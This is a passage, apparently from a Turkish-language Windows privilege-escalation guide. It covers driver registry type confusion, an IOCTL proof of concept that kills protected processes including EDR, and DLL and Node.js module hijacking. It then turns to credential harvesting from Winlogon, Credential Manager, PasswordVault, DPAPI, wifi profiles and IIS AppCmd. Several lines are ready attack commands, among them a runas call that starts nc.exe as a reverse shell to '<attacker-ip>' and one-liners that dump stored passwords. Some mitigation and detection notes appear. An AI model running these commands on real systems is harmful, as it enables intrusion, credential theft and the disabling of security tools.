#### Saldırgan denetimindeki path’lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver’lar userland’den bir registry path kabul eder, bunun geçerli bir UTF-16 string olduğunu doğrulamakla yetinir ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar’ına `RTL_QUERY_REGISTRY_DIRECT` ile yapar. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği türe göre değil, registry’deki **gerçek** türe göre yorumlanır.

Bu, işe yarar iki primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı denetimindeki mutlak bir `\Registry\...` path’i, driver’ın saldırganın seçtiği key’leri sorgulamasına, return code’lar/log’lar üzerinden varlıklarını sızdırmasına ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutu belirtilmiş bir binary buffer olarak type confusion’a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **untrusted hive**’a erişirse, kernel caller’lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile çöker. Exploitability’yi korumak için, değerleri `HKCU` altında hazırlamak yerine **trusted system hive’lar içindeki saldırgan tarafından yazılabilir key’leri** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir öğeleri listelemek için NtObjectManager kullanın ve sandboxed context’lerden erişilebilen key’leri bulmak için taramayı kopyalanmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4 baytlık bir `int` değişkenine doğrudan 8 bayt yazılması, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD` değerini stack scalar'ına yükler ve ardından aynı buffer'ı bir string read için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkileyerek kısmen kontrol edilebilir bir kernel write elde eder.
- **`REG_BINARY`**: Büyük binary veriler için direct mode, `EntryContext`'teki ilk `LONG` değerini işaretli bir buffer boyutu olarak ele alır. Önceki bir `REG_DWORD` read, yeniden kullanılan scalar'da saldırganın kontrolündeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` query, saldırganın byte'larını bitişik stack slot'larının üzerine doğrudan kopyalar. Bu genellikle callback-pointer'ı tamamen üzerine yazmanın en temiz yoludur.

Güçlü bir avlama örüntüsü: **aynı stack variable'a yeniden başlatmadan yapılan heterojen registry read'leri**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini belirlediği code path'ler için grep yapın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar, IoCreateDeviceSecure aracılığıyla güçlü bir SDDL ile device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN ayarlamayı unutur. Bu flag olmadan, device ek bir bileşen içeren bir path üzerinden açıldığında güvenli DACL uygulanmaz. Böylece ayrıcalıksız herhangi bir kullanıcı aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek dünyada gözlemlenen örnek yetenekler:
- İstenilen process'lere tam erişimli handle'lar döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser aracılığıyla SYSTEM shell).
- Kısıtlamasız raw disk read/write (çevrimdışı tampering, boot-time persistence hileleri).
- Protected Process/Light (PP/PPL) dahil olmak üzere istenilen process'leri sonlandırma; böylece user land üzerinden kernel aracılığıyla AV/EDR kill.

Minimal PoC örüntüsü (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. Process termination veya handle return işlemlerine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri kısıtlayın (access mask'ler, METHOD_*, input validation) ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Savunucular için tespit fikirleri
- Şüpheli device name'lere (ör. \\ .\\amsdk*) yönelik user-mode açma işlemlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi allow/deny list'lerinizi güncel tutun.


## PATH DLL Hijacking

**PATH içindeki bir klasörde yazma izinleriniz** varsa, bir process tarafından yüklenen DLL'i hijack edip **yetki yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu kontrolün nasıl kötüye kullanılabileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümleme hijacking'i

Bu, beklenen modül **eksik** olduğunda `require("foo")` gibi yalın bir import gerçekleştiren **Node.js** ve **Electron** uygulamalarını etkileyen bir **Windows denetimsiz arama yolu** varyantıdır.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows'ta bu arama sürücü köküne kadar ulaşabilir; dolayısıyla `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları yoklayabilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalışır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısı üzerinden veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulaması olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu senaryolarda yaygındır:

- Bir bağımlılık `optionalDependencies` içinde tanımlanmışsa<sup>[[22]](#references)</sup>
- Üçüncü taraf bir kütüphane `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- Bir paket üretim derlemelerinden kaldırılmış, paketleme sırasında atlanmış veya kurulumu başarısız olmuşsa
- Güvenlik açığına sahip `require()` ana uygulama kodu yerine bağımlılık ağacının derinlerinde bulunuyorsa

### Güvenlik açığı bulunan hedefleri araştırma

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` filtresini hedef çalıştırılabilir dosyaya (`node.exe`, Electron uygulamasının EXE'si veya sarmalayıcı süreç) göre ayarlayın
- `Path` filtresini `contains` `node_modules` olacak şekilde ayarlayın
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketlenmemiş `.asar` dosyalarında veya uygulama kaynaklarında işe yarayan kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz mevcut değilse kök arama dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen adla tam olarak eşleşen bir modül yerleştirin:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse, Node `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu örüntüye uyan, gerçek dünyada karşılaşılan eksik isteğe bağlı modüller arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleyeceği eksik bir **bare import** bulun.

### Tespit ve güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretim ortamında tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarda sessiz `try { require("...") } catch {}` örüntülerini inceleyin.
- Kütüphane destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin bazı `ws` dağıtımlarında `WS_NO_UTF_8_VALIDATE=1` kullanılarak eski `utf-8-validate` kontrolü atlanabilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış bilinen başka bilgisayarlar olup olmadığını kontrol edin

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlanmış hizmetleri** kontrol edin

```bash
netstat -ano #Opened ports?
```

Yerel bir listener için PID'yi süreç sahibi, çalıştırılabilir dosya yolu ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir uzaktan denetim hizmeti, yalnızca kimlik doğrulama ve komut denetimleri buna izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklara sahip bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: listener ve binary yolu pasif ipuçlarıdır; kimliği doğrulanmış bir bellek bozulması yolu ise tam olarak o binary'nin ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir portun bir sistem sürecine ait olduğu görülüyorsa arka uç hizmetini belirlemeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) komutunun çıktısıyla karşılaştırın; yalnızca bir yönlendirme kuralının bulunması, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall Kuralları

[**Firewall ile ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Ağ keşfi için daha[ fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısı olursanız herhangi bir portu dinleyebilirsiniz (bir portu dinlemek için ilk kez `nc.exe` kullandığınızda, GUI üzerinden `nc`'nin güvenlik duvarı tarafından engellenmesine izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` hesabı, tek başına Windows Yönetici hakları sağlamaz. Geçerli Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutlar için kabuk geçmişi dosyalarını (ör. `/root/.bash_history`) inceleyin; yetki yükseltme için yine de daha yüksek ayrıcalıklı geçerli bir hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` düzeni eski WSL kurulumları için geçerlidir; WSL 2, dağıtımı genellikle bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) depolar. Bu nedenle öncelikle gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş içeriğini yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgileri değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, kayıt defterinde bulunan bir düz metin bulgusudur. `AutoAdminLogon=1` ise ancak okunabilir düz metin parola yoksa bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak depolayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve kayıt defterini sıradan şekilde okumak, bu secret'ın var olup olmadığını veya erişilebilir olup olmadığını ortaya koymaz. Kimlik bilgilerinin açığa çıktığını bildirmeden önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Kimlik Bilgileri Yöneticisi / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> kaynağından\
Windows Vault; sunucular, web siteleri ve diğer programlar için **Windows'un kullanıcıları otomatik olarak oturum açtırırken kullanabileceği** kimlik bilgilerini depolar. İlk başta bu, kullanıcıların Facebook, Twitter veya Gmail gibi siteler için kimlik bilgilerini depolayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyor gibi gelebilir, ancak sistem böyle çalışmaz.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırırken kullanabileceği kimlik bilgilerini depolar. Bu da bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan **herhangi bir Windows uygulamasının** bu Credential Manager ve Windows Vault'tan **yararlanabileceği** ve kullanıcıların sürekli kullanıcı adı ile parola girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanabileceklerini sanmıyorum. Bu nedenle, uygulamanız kasadan yararlanmak istiyorsa, varsayılan depolama kasasından o kaynağa ait kimlik bilgilerini **istemek için credential manager ile iletişim kurması** gerekir.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, SMB paylaşımı üzerinden uzak bir binary dosyasını çağırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla da.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama belirteçlerini ve düz metin parolalarını Universal Windows Platform (UWP) `PasswordVault` içinde depolar (`vaultcmd` aracında `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumlara göre yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan yerel olarak çözülebilir.

Depolanan tüm kullanıcı adlarını ve düz metin parolalarını anında dökmek ve çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve Windows işletim sistemi içinde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için kullanıcıya veya sisteme ait bir gizli bilgiden yararlanır.

**DPAPI, kullanıcının oturum açma gizli bilgilerinden türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin etki alanı kimlik doğrulama gizli bilgilerini kullanır.

DPAPI ile şifrelenen kullanıcı RSA anahtarları, kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eden `{SID}` ile `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Aynı dosyada kullanıcının özel anahtarlarını koruyan master key ile birlikte bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişim kısıtlıdır; bu nedenle CMD'de `dir` komutuyla içeriği listelenemez, ancak PowerShell üzerinden listelenebilir.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz modülündeki** `dpapi::masterkey` komutunu kullanabilirsiniz.

**Ana parolayla korunan kimlik bilgisi dosyaları** genellikle şu konumlarda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` uygun parametresiyle **mimikatz module** `dpapi::cred` kullanarak şifre çözebilirsiniz.\
(root yetkiniz varsa) `sekurlsa::dpapi` module ile **memory** içinden çok sayıda DPAPI **masterkey** **extract** edebilirsiniz.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini kolayca saklamak için genellikle **scripting** ve otomasyon görevlerinde kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Dışa aktarılmış bir credential dosyası, herhangi bir dosya adına veya `.xml` yoluna sahip olabilir. Bir script veya dosya envanteri böyle bir dosyaya işaret ediyorsa, `C:\Users` dizininde olduğunu varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir credential'ı dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette ayrıca geçerli haklara sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya düz metin değerleri yazdırmadan önce yolları ve ACL'leri inceleyin.

İçinde bulunduğu dosyadan bir PS credentials'ın şifresini **çözmek** için şunu kullanabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekteki birçok DPAPI masterkey'i **çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcı Belgeleri altındaki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Geniş kapsamlı taramalar sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** da kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda olabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, bir kimlik bilgisi adayı olarak değerlendirin: [üreticinin belirttiğine göre](https://www.donkz.nl/) profil koruması, oluşturan hesaba ve bilgisayara bağlanabilir veya daha gevşek şekilde yapılandırılabilir. Buna güvenmeden önce dosyanın kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

Kullanıcılar Windows iş istasyonlarında parolaları ve diğer bilgileri veritabanı dosyası olduğunu fark etmeden **kaydetmek** için sık sık Sticky Notes uygulamasını kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

Kullanıcılar bazen yapışkan not uygulamalarında parolaları ve diğer bilgileri saklar. Microsoft'un paketlenmiş Sticky Notes uygulaması genellikle notları `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; daha eski veya farklı uygulamalar LevelDB dahil olmak üzere başka kullanıcı profili depoları kullanabilir. Eksik bir SQLite dosyasını notların bulunmadığına kanıt saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının kopyalanması yakın zamanda kaydedilmiş notları içermeyebilir. `plum.sqlite-wal` dosyasını veritabanının tutarlı bir kopyasıyla birlikte saklayın ve varsa `plum.sqlite-shm` dosyasını da ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrıca doğrulayın. Şifrelenmiş bir password manager kaydının daha yüksek ayrıcalıklı bir oturumu kanıtlayabilmesi için gerçek şifre çözme anahtarı ve uygulamaya özgü yorumlama da gerekir.

### AppCmd.exe

**AppCmd.exe'den parola kurtarmak için Administrator olmanız ve High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) kaynağından alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
